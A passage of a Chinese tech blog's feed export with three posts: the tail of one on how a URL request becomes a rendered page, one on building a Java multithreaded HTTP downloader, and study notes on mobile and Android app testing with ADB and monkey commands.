id="6-数据到达数据链路层"><a href="#6-数据到达数据链路层" class="headerlink" title="6.数据到达数据链路层"></a>6.数据到达数据链路层</h4><pre><code>在找到对方的MAC地址后，就将数据发送到数据链路层传输。这时，客户端发送请求的阶段结束</code></pre><h4 id="7-服务器接收数据"><a href="#7-服务器接收数据" class="headerlink" title="7.服务器接收数据"></a>7.服务器接收数据</h4><pre><code>接收端的服务器在链路层接收到数据包，再层层向上直到应用层。这过程中包括在运输层通过TCP协议讲分段的数据包重新组成原来的HTTP请求报文。</code></pre><h4 id="8-服务器响应请求"><a href="#8-服务器响应请求" class="headerlink" title="8.服务器响应请求"></a>8.服务器响应请求</h4><pre><code>服务接收到客户端发送的HTTP请求后，查找客户端请求的资源，并返回响应报文，响应报文中包括一个重要的信息——状态码。状态码由三位数字组成，其中比较常见的是200 OK表示请求成功。301表示永久重定向，即请求的资源已经永久转移到新的位置。在返回301状态码的同时，响应报文也会附带重定向的url，客户端接收到后将http请求的url做相应的改变再重新发送。404 not found 表示客户端请求的资源找不到。</code></pre><h4 id="9-服务器返回相应文件"><a href="#9-服务器返回相应文件" class="headerlink" title="9. 服务器返回相应文件"></a>9. 服务器返回相应文件</h4><pre><code>请求成功后，服务器会返回相应的HTML文件。接下来就到了页面的渲染阶段了。</code></pre><h3 id="二、页面渲染"><a href="#二、页面渲染" class="headerlink" title="二、页面渲染"></a>二、页面渲染</h3><pre><code>现代浏览器渲染页面的过程是这样的：解析HTML以构建DOM树 –&gt; 构建渲染树 –&gt; 布局渲染树 –&gt; 绘制渲染树。DOM树是由HTML文件中的标签排列组成，渲染树是在DOM树中加入CSS或HTML中的style样式而形成。渲染树只包含需要显示在页面中的DOM元素，像&lt;head&gt;元素或display属性值为none的元素都不在渲染树中。在浏览器还没接收到完整的HTML文件时，它就开始渲染页面了，在遇到外部链入的脚本标签或样式标签或图片时，会再次发送HTTP请求重复上述的步骤。在收到CSS文件后会对已经渲染的页面重新渲染，加入它们应有的样式，图片文件加载完立刻显示在相应位置。在这一过程中可能会触发页面的重绘或重排。</code></pre></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从输入URL到显示页面经历了什么&quot;&gt;&lt;a href=&quot;#从输入URL到显示页面经历了什么&quot; class=&quot;headerlink&quot; title=&quot;从输入URL到显示页面经历了什么?&quot;&gt;&lt;/a&gt;从输入URL到显示页面经历了什么?&lt;/h1&gt;&lt;blockquote&gt;
&lt;u
      
    
    </summary>
    
    
    
      <category term="network" scheme="https://kayleh.top/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>Download</title>
    <link href="https://kayleh.top/Download/"/>
    <id>https://kayleh.top/Download/</id>
    <published>2021-03-15T17:18:07.000Z</published>
    <updated>2021-03-14T12:38:47.371Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-多线程下载器的设计与实现"><a href="#Java-多线程下载器的设计与实现" class="headerlink" title="Java 多线程下载器的设计与实现"></a>Java 多线程下载器的设计与实现</h1><p>应用并发的场景有很多，下载文件就是一个很常见的并发场景。</p><p>为什么会想写多线程下载器呢？不知道你用过 IDM（Internet Download Manager）没，我刚使用 IDM 时，就被它的下载方式吸引了。</p><p>用 IDM 下载文件时，能够直观地看到它的下载过程：固定用 N 个线程下载文件，一开始先将文件分为 N 段，每段用一个线程下载，当某一段下载完成之后，对应的线程就空闲了，此时怎么做呢？从剩余的 N - 1 段中取出最大的一段，一分为二，这样就又有了 N 段的数据，让空闲的线程去下载新划分出来的这一段。</p><p>每当有一个线程完成下载任务时，就不断从剩余的部分中划分出一段给它下载，直到整个文件的所有部分都下载完毕。</p><p>当然，文件并不能被无限地分段，IDM 会设定一个段的阈值，当剩余的最大段小于这个阈值的时候，就不再分段了给空闲的线程了，只等待活动中的所有线程下载完毕。</p><p><img src="/Download/Blog\source\_posts\DOWNLOAD\idm.png" alt="img"></p><p>说完 IDM 的下载策略，我们大致有了思路。不过优秀的软件不是一蹴而就的，虽然我们想写出像 IDM 的下载器，但还需要从简单的实现开始，不断迭代优化。</p><p>所以我们一开始采用的策略是：固定 N 个线程，并将文件划分为 N 段，每个线程负责下载一段数据。</p><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><p><strong>判断服务器是否支持断点续传</strong></p><p>首先要明确的是，多线程下载文件利用的是每个线程下载文件的一部分，那么就需要 HTTP 服务器支持请求部分数据，或者说断点续传，因此第一步需要判断目标文件是否支持断点续传。</p><p>HTTP 请求头中有一个 <code>Range</code> 字段，可以用来指定要请求的数据范围，例如我们要请求从第 10 字节到第 20 字节的数据，可以将该字段写为 <code>Range:bytes=10-20</code>。</p><p>相应的，如果 HTTP 服务器支持断点续传，那么对于指定了 <code>Range</code> 字段的请求，会返回 206 状态码。</p><p>我们用 Curl 来测试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I --header <span class="string">"Range: bytes=0-"</span> http://mirrors.163.com/debian/ls-lR.gz</span><br></pre></td></tr></table></figure><p>得到的响应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 206 Partial Content</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Wed, 25 Apr 2018 02:57:56 GMT</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line">Content-Length: 15316619</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Last-Modified: Mon, 23 Apr 2018 14:38:44 GMT</span><br><span class="line">ETag: &quot;5addeff4-e9b68b&quot;</span><br><span class="line">Content-Range: bytes 0-15316618&#x2F;15316619</span><br></pre></td></tr></table></figure><p>我们设置 <code>Range: bytes=0-</code> ，表示请求从第 0 字节到最后一字节的数据，那为什么还要指定该字段呢？这是出于两方面的原因：一是判断响应的状态码是否为 206，二是得到文件的大小。</p><p>如果服务器支持断点续传，那么我们采用多线程进行下载，如果不支持断点续传，就采用单线程下载。</p><p><strong>文件分段</strong></p><p>我们得到了文件的大小 fileSize，将其分为 N 段，则每一段的大小为 <code>fileSize / N</code>，由于文件通常不会正好被分为 N 段，因此最后一段就等于剩余的部分的大小。</p><p>我们用一个数组 endPoint 来存放每一段的起止位置，例如一个 10 B 的文件，起止范围是 0~9，如果分为 3 段下载，那么 <code>endPoint = {0, 3, 6, 10}</code>，对每段来说是左闭右开区间。</p><p>解释：对于第 i 段（i 从 0 开始）来说，从 <code>endPoint[i]</code> 开始下载，在 <code>endPoint[i + 1] - 1</code> 处停止。同理，对第 i + 1 段来说，从 <code>endPoint[i + 1]</code> 开始，在 <code>endPoint[i + 2] - 1</code> 处停止。</p><p><strong>创建下载线程</strong></p><p>我们为每一段创建一个下载线程进行下载，每一段都存放在一个单独的临时文件中。</p><p>下载线程需要做的事情可以总结如下：</p><ul><li>设置请求头的 <code>Range</code> 字段来指定请求范围</li><li>设置超时时间</li><li>连接 HTTP 服务器</li><li>创建临时文件（第一次下载该段）</li><li>读取服务器返回的数据，写入到临时文件，直到读取的字节数等于该段的大小</li><li>关闭临时文件</li></ul><p>上面是顺利下载的流程，我们还需要在出现下列问题时进行重试：</p><ul><li>如果连接时间或读取时间超时</li><li>临时文件读写出错</li></ul><p>这样又有问题了，对于该线程来说，重试时是重新下载整段，还是接着下载剩余部分？我们知道，最好就是接着下载还没下完的那部分，那如何实现呢？</p><p>我们可以这么做：每个线程保存自己负责部分的起止位置，在刚启动线程时，起止位置就是段的起止位置，创建临时文件写出已下载的数据。在下载数据时，实时更新线程的起始位置为当前已下载字节的下一个字节，当出错需要重试时，直接从该位置开始，并且写出到之前创建的临时文件中。</p><p><strong>创建监视线程</strong></p><p>我们创建一个守护线程，负责监视文件的下载进度、下载速度、当前活跃线程数，在各线程下载结束后，通知主线程做下一步处理。</p><p><strong>处理临时文件</strong></p><p>当主线程收到通知，所有部分都下载完成时，就需要对临时文件进行清理。</p><p>如果是多线程下载的文件，那么需要对多个临时文件进行合并。</p><p>如果是单线程下载的文件，则对临时文件进行重命名。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>这里给出程序的轮廓，进行整体上的介绍，完整的源码可查看 Github：<a href="https://github.com/wrayzheng/java-multithread-downloader" target="_blank" rel="noopener">https://github.com/wrayzheng/java-multithread-downloader</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpDownloader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> resumable;</span><br><span class="line">    <span class="keyword">private</span> URL url;</span><br><span class="line">    <span class="keyword">private</span> File localFile;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] endPoint;</span><br><span class="line">    <span class="keyword">private</span> Object waiting = <span class="keyword">new</span> Object();</span><br><span class="line">    <span class="keyword">private</span> AtomicInteger downloadedBytes = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">private</span> AtomicInteger aliveThreads = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> multithreaded = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> fileSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> THREAD_NUM = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> TIME_OUT = <span class="number">5000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> MIN_SIZE = <span class="number">2</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HttpDownloader</span><span class="params">(String Url, String localPath)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HttpDownloader</span><span class="params">(String Url, String localPath,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">int</span> threadNum, <span class="keyword">int</span> timeout)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开始下载文件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检测目标文件是否支持断点续传，以决定是否开启多线程下载文件的不同部分</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">supportResumeDownload</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//监测下载速度及下载状态，下载完成时通知主线程</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownloadMonitor</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对临时文件进行合并或重命名</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cleanTempFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//合并多线程下载产生的多个临时文件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//一个下载线程负责下载文件的某一部分，如果失败则自动重试，直到下载完成</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> start;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> end;</span><br><span class="line">        <span class="keyword">private</span> OutputStream out;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DownloadThread</span><span class="params">(<span class="keyword">int</span> id, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//保证文件的该部分数据下载完成</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//下载文件指定范围的部分</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">download</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将 DownloadThread 定义为 HttpDownloader 的内部类，这是因为一个 HttpDownloader 实例对应一个文件下载任务，该实例中存放了该任务的各种数据，而下载线程是与该任务是关联的，需要用到这些数据，因此定义为内部类可以直接共享这些数据，从而避免过多的参数传递和存储。</p><p>要下载一个文件，首先创建一个 HttpDownloader 实例，必须传入的参数是目标文件 URL 和本地的存储位置，可选参数是线程数和超时时间。</p><p>HttpDownloader 的入口方法为 get()，它的工作如下：</p><ul><li>调用 supportResumeDownload() 方法判断目标文件是否支持断点续传以及是否大于设定的文件最小值，以决定是否采取多线程的下载方式；</li><li>计算每一段的起止位置，存入 endPoint；</li><li>创建 DownloadThread 线程进行下载；</li><li>调用 startDownloadMonitor() 方法启动监视线程；</li><li>等待文件下载完毕；</li><li>调用 cleanTempFile() 处理临时文件；</li><li>输出结束信息。</li></ul><p>再来介绍一下 DownloadThread，它的入口方法是 run()，工作如下：</p><ul><li>调用 download() 方法下载指定部分的数据;</li><li>如果成功，则线程结束，如果失败，则回到上一步。</li></ul><h3 id="下载测试"><a href="#下载测试" class="headerlink" title="下载测试"></a>下载测试</h3><p>对于单个连接限速的服务器，多线程下载才能体现其优势，如果服务器本身不对连接限速，那么单个连接也能接近带宽上限。</p><p>我们来看看，对于单个连接速度远小于带宽时，单线程与多线程的对比。</p><p>首先是单个线程进行下载：</p><p><img src="/Download/Blog\source\_posts\DOWNLOAD\downloader-one-threads.gif" alt="img"></p><p>用时 54.133 秒，平均下载速度 42 KB/s。</p><p>开启 10 个线程进行下载：</p><p><img src="/Download/Blog\source\_posts\DOWNLOAD\downloader-ten-threads.gif" alt="img"></p><p>用时 10.144 秒，平均下载速度 228 KB/s。</p><p>可以看到，相比单线程下载，开启多线程之后下载速度有了巨大的提升。</p><p>在实际下载时，根据网络状况不同，设置不同的超时时间，对下载速度也有不小的影响。如果超时时间设置过小，会导致线程频繁建立连接，而建立连接是相对耗时的操作，导致下载效率低下；如果超时时间设置过长，可能连接已经失效，而客户端却长时间等待，无谓地消耗时间。</p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这是一个最基本的多线程下载器的实现，将文件划分为固定的 N 段，分配给 N 个线程下载，当一个线程下载完成后，该线程就随之结束了，没有被再次利用。</p><p>之后我会对该程序做进一步的优化，一方面会采取和 IDM 类似的下载策略，进一步提高下载效率，另一方面，也会在功能和鲁棒性方面进行加强，完善异常处理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java-多线程下载器的设计与实现&quot;&gt;&lt;a href=&quot;#Java-多线程下载器的设计与实现&quot; class=&quot;headerlink&quot; title=&quot;Java 多线程下载器的设计与实现&quot;&gt;&lt;/a&gt;Java 多线程下载器的设计与实现&lt;/h1&gt;&lt;p&gt;应用并发的场景有很多
      
    
    </summary>
    
    
    
      <category term="C" scheme="https://kayleh.top/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>app test</title>
    <link href="https://kayleh.top/app-test/"/>
    <id>https://kayleh.top/app-test/</id>
    <published>2021-03-03T16:49:54.000Z</published>
    <updated>2021-03-14T09:19:01.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="移动端测试要点"><a href="#移动端测试要点" class="headerlink" title="移动端测试要点"></a>移动端测试要点</h2><h3 id="安装测试、卸载测试"><a href="#安装测试、卸载测试" class="headerlink" title="安装测试、卸载测试"></a>安装测试、卸载测试</h3><h3 id="UI测试"><a href="#UI测试" class="headerlink" title="UI测试"></a>UI测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615137765268.png" alt="1615137765268" style="zoom:50%;"></p><h3 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615133542830.png" alt="1615133542830" style="zoom:50%;"></p><h4 id="运行app"><a href="#运行app" class="headerlink" title="运行app"></a>运行app</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615134963504.png" alt="1615134963504"></p><h4 id="应用的前后台切换"><a href="#应用的前后台切换" class="headerlink" title="应用的前后台切换"></a>应用的前后台切换</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615134979917.png" alt="1615134979917"></p><h4 id="免登陆"><a href="#免登陆" class="headerlink" title="免登陆"></a>免登陆</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135150085.png" alt="1615135150085"></p><h4 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135195319.png" alt="1615135195319"></p><h4 id="离线浏览"><a href="#离线浏览" class="headerlink" title="离线浏览"></a>离线浏览</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135394779.png" alt="1615135394779"></p><h4 id="app更新"><a href="#app更新" class="headerlink" title="app更新"></a>app更新</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135456332.png" alt="1615135456332"></p><h4 id="定位、照相机服务"><a href="#定位、照相机服务" class="headerlink" title="定位、照相机服务"></a>定位、照相机服务</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135477942.png" alt="1615135477942"></p><h4 id="时间测试"><a href="#时间测试" class="headerlink" title="时间测试"></a>时间测试</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135504852.png" alt="1615135504852"></p><h4 id="PUSH测试"><a href="#PUSH测试" class="headerlink" title="PUSH测试"></a>PUSH测试</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135520679.png" alt="1615135520679">    </p><h3 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136053666.png" alt="1615136053666" style="zoom:50%;"></p><h3 id="交叉事件测试"><a href="#交叉事件测试" class="headerlink" title="交叉事件测试"></a>交叉事件测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136213904.png" alt="1615136213904"></p><p>例如：微信视频和来电</p><h3 id="兼容性测试"><a href="#兼容性测试" class="headerlink" title="兼容性测试"></a>兼容性测试</h3><h3 id="升级、更新测试"><a href="#升级、更新测试" class="headerlink" title="升级、更新测试"></a>升级、更新测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136698549.png" alt="1615136698549" style="zoom:50%;"></p><h3 id="用户体验测试"><a href="#用户体验测试" class="headerlink" title="用户体验测试"></a>用户体验测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136880550.png" alt="1615136880550" style="zoom:50%;"></p><h3 id="硬件环境测试"><a href="#硬件环境测试" class="headerlink" title="硬件环境测试"></a>硬件环境测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136938152.png" alt="1615136938152" style="zoom:50%;"></p><h3 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h3><h3 id="客户端数据库测试"><a href="#客户端数据库测试" class="headerlink" title="客户端数据库测试"></a>客户端数据库测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615137461874.png" alt="1615137461874"></p><h3 id="安全测试"><a href="#安全测试" class="headerlink" title="安全测试"></a>安全测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615137928157.png" alt="1615137928157" style="zoom:33%;"></p><h1 id="Android测试"><a href="#Android测试" class="headerlink" title="Android测试"></a>Android测试</h1><p>Android系统的基本结构</p><blockquote><p>linux内核层</p><p>Android函数库和Android运行的虚拟机</p><p>应用程序框架</p><p>应用程序</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615140074133.png" alt="1615140074133"></p><h4 id="测试术语"><a href="#测试术语" class="headerlink" title="测试术语"></a>测试术语</h4><ul><li>系 统碎片化</li><li>屏幕尺寸</li><li>分辨率</li><li>像素</li><li>网络制式</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615140333141.png" alt="1615140333141" style="zoom:33%;"></p><h5 id="像素"><a href="#像素" class="headerlink" title="像素"></a>像素</h5><p>一位=8字节</p><p>大小 1156*634 = 732904</p><p>732904/8=9291613=92K</p><p>9291613/1024=89.</p><h5 id="网络制式"><a href="#网络制式" class="headerlink" title="网络制式"></a>网络制式</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615142556664.png" alt="1615142556664" style="zoom: 50%;"></p><h3 id="Android四大组件"><a href="#Android四大组件" class="headerlink" title="Android四大组件"></a>Android四大组件</h3><blockquote><p>缺一不可</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615232986341.png" alt="1615232986341" style="zoom:50%;"></p><ul><li>活动</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233173816.png" alt="1615233173816" style="zoom:33%;"></p><ul><li>服务</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233382480.png" alt="1615233382480" style="zoom:50%;"></p><ul><li>内容提供者</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233473534.png" alt="1615233473534" style="zoom: 50%;"></p><ul><li>广播接受者</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233720649.png" alt="1615233720649" style="zoom:50%;"></p><h2 id="Android测试环境搭建"><a href="#Android测试环境搭建" class="headerlink" title="Android测试环境搭建"></a>Android测试环境搭建</h2><h4 id="one-真机测试"><a href="#one-真机测试" class="headerlink" title=":one:真机测试"></a>:one:真机测试</h4><p>使用真实的手机测试</p><h4 id="two-安卓模拟器"><a href="#two-安卓模拟器" class="headerlink" title=":two:安卓模拟器"></a>:two:安卓模拟器</h4><h4 id="three-Android自带的模拟器"><a href="#three-Android自带的模拟器" class="headerlink" title=":three:Android自带的模拟器"></a>:three:Android自带的模拟器</h4><h4 id="four-云真机测试"><a href="#four-云真机测试" class="headerlink" title=":four:云真机测试"></a>:four:云真机测试</h4><h3 id="Android开发环境"><a href="#Android开发环境" class="headerlink" title="Android开发环境"></a>Android开发环境</h3><ul><li>安装java, jdk</li><li>ADT工具包<img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615234913928.png" alt="1615234913928" style="zoom:50%;"></li></ul><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615309230399.png" alt="1615309230399" style="zoom: 50%;"></p><p>打开eclipse</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615310931766.png" alt="1615310931766" style="zoom:50%;"></p><h4 id="ADB命令"><a href="#ADB命令" class="headerlink" title="ADB命令"></a>ADB命令</h4><ul><li><h5 id="启动和关闭服务"><a href="#启动和关闭服务" class="headerlink" title="启动和关闭服务"></a>启动和关闭服务</h5></li></ul><blockquote><p>adb kill-server</p><p>adb start server</p></blockquote><ul><li><p>adb.exe connect 127.0.0.1:62001 </p></li><li><h5 id="查看设备连接情况"><a href="#查看设备连接情况" class="headerlink" title="查看设备连接情况"></a>查看设备连接情况</h5></li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615312862427.png" alt="1615312862427" style="zoom:50%;"></p><ul><li>安装和卸载APK程序</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615313005852.png" alt="1615313005852" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615313041547.png" alt="1615313041547" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314153934.png" alt="1615314153934" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314260967.png" alt="1615314260967" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314304693.png" alt="1615314304693" style="zoom:50%;"></p><ul><li>列出当前设备上的程序包</li></ul><blockquote><p>adb shell pm list packages</p></blockquote><ul><li>上传和下载</li></ul><blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615314565572.png" alt="1615314565572" style="zoom:50%;"></p></blockquote><ul><li>日志</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396174848.png" alt="1615396174848" style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396200109.png" alt="1615396200109" style="zoom: 50%;"></p><blockquote><p>过滤<img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396478274.png" alt="1615396478274"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396559638.png" alt="1615396559638" style="zoom:50%;"></p><ul><li>其他</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615396733068.png" alt="1615396733068" style="zoom:50%;"></p><blockquote><p>adb bugreport</p></blockquote><h4 id="monkey命令"><a href="#monkey命令" class="headerlink" title="monkey命令"></a>monkey命令</h4><h5 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a><strong>是什么？</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615481732999.png" alt="1615481732999" style="zoom:50%;"></p><ul><li><p>所有的操作事件都是随机发生的。不以让人的意志为变化。 由于事件都是随机的、无序的，所以不做功能方面的测试，只对APP进行性能、稳定性方面的测试。</p></li><li><p>monkey测试的时候，需要长时间、大量的操作事件</p></li></ul><h5 id="特征"><a href="#特征" class="headerlink" title="特征"></a><strong>特征</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615482052583.png" alt="1615482052583" style="zoom:50%;"></p><h5 id="Monkey的停止条件"><a href="#Monkey的停止条件" class="headerlink" title="Monkey的停止条件"></a>Monkey的停止条件</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483112988.png" alt="1615483112988" style="zoom:50%;"></p><h5 id="进入Monkey"><a href="#进入Monkey" class="headerlink" title="进入Monkey"></a>进入Monkey</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483206902.png" alt="1615483206902" style="zoom:50%;"></p><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483820132.png" alt="1615483820132" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615483835799.png" alt="1615483835799" style="zoom:50%;"></p><blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484056012.png" alt="1615484056012" style="zoom:50%;"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484263141.png" alt="1615484263141" style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615484482624.png" alt="1615484482624" 